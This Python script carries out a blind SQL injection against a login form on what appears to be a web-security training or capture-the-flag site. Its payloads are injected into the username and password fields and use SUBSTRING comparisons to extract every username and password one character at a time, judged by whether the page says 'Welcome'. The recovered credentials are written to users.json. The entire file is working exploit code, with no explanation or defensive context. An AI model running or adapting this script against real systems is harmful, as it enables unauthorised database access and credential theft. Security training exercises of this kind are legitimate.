import requests
import json
import string

def try_char_user(user_pos: int, position: int, character: str) -> bool:
    payload = f"' OR SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET {user_pos}),{position},1) = '{character}' -- "
    data = {
        "username": payload,
        "password": "password",
    }
    response = requests.post(website, data=data)
    if "Welcome" in response.text:
        return True
    else:
        return False


def try_char_password(user: str, position: int, character: str) -> bool:
    payload = f"' OR SUBSTRING((SELECT password FROM users WHERE username = '{user}'), {position}, 1) = '{character}' -- "
    data = {
        "username": user,
        "password": payload,
    }
    response = requests.post(website, data=data)
    if "Welcome" in response.text:
        return True
    else:
        return False


def extract_users(users: list) -> None:
    print("\n---- STARTING USERNAME EXTRACTION ----")
    user_pos = 0
    while True:
        extracted_username = ""
        print(f"-Extracting username #{user_pos + 1}: [ ", end="")
        position = 1

        while True:
            found = False
            for char in char_set:
                if try_char_user(user_pos, position, char):
                    print(f"{char}", end="")
                    extracted_username += char
                    found = True
                    break

            if not found:
                print(" ]")
                break

            position += 1

        if extracted_username:
            users.append(extracted_username)
            user_pos += 1
        else:
            print("---- NO MORE USERS FOUND ----")
            break


def extract_passwords(users: list, passwords: list) -> None:
    print("\n---- STARTING PASSWORD EXTRACTION ----")
    user_pos = 0
    while user_pos < len(users):
        extracted_password = ""
        print(f"-Extracting password of [{users[user_pos]}]: [ ", end="")
        position = 1

        while True:
            found = False
            for char in char_set:
                if try_char_password(users[user_pos], position, char):
                    print(f"{char}", end="")
                    extracted_password += char
                    found = True
                    break

            if not found:
                print(" ]")
                break

            position += 1

        if extracted_password:
            passwords.append(extracted_password)
            user_pos += 1
        else:
            print("---- NO MORE PASSWORDS FOUND ----")
            break


if __name__ == "__main__":

    website = "https://task2.websec.srdnlen.it/login.php"
    char_set = string.ascii_letters + string.digits + string.punctuation

    users = []
    passwords = []
    extract_users(users)
    extract_passwords(users, passwords)
    data = {}
    for index in range(len(users)):
        data[users[index]] = passwords[index]
    with open("users.json", "w") as f:
       json.dump(data, f)

